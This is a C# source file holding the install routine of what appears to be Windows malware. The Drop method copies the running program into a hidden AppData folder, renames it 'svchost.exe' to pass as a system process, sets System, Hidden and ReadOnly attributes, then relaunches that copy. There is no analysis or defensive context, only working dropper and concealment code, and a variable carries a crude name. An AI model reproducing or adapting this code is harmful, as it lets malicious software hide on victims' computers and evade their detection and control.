using System;
using System.Diagnostics;
using System.IO;

namespace myApp
{
    class Install
    {
        public static string gay = "WindowsUpdate";
        public static string TargetExeName = "svchost.exe";
        public static string targetFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\dll";
        public static string goodpath = Path.Combine(targetFolder, TargetExeName);
        public static void Drop()
        {

            if (Environment.CurrentDirectory != targetFolder)
            {
                if (File.Exists(goodpath))
                {
                    try
                    {
                        File.SetAttributes(goodpath, FileAttributes.Normal);
                        File.Delete(goodpath);
                        File.Copy(Process.GetCurrentProcess().MainModule.FileName, goodpath);
                        File.SetAttributes(goodpath,
                                           File.GetAttributes(goodpath) | FileAttributes.System |
                                           FileAttributes.Hidden | FileAttributes.NotContentIndexed |
                                           FileAttributes.ReadOnly);
                        var myPath = new ProcessStartInfo
                                         {
                                             FileName = "svchost.exe",
                                             WorkingDirectory = targetFolder
                                         };
                        Process.Start(myPath);
                        Environment.Exit(0);

                    }
                    catch
                    {
                    }
                }


                else
                {
                    try
                    {
                        if (!Directory.Exists(targetFolder))
                        {
                            Directory.CreateDirectory(targetFolder);

                            File.SetAttributes(targetFolder,
                                               File.GetAttributes(targetFolder) | FileAttributes.System |
                                               FileAttributes.Hidden | FileAttributes.ReadOnly | FileAttributes.NotContentIndexed);
                        }
                        File.Copy(Process.GetCurrentProcess().MainModule.FileName, goodpath);
                        var myPath = new ProcessStartInfo
                                         {
                                             FileName = "svchost.exe",
                                             WorkingDirectory = targetFolder
                                         };
                        Process.Start(myPath);
                        Environment.Exit(0);
                    }
                    catch
                    {
                    }
                }
            }
        }
    }
}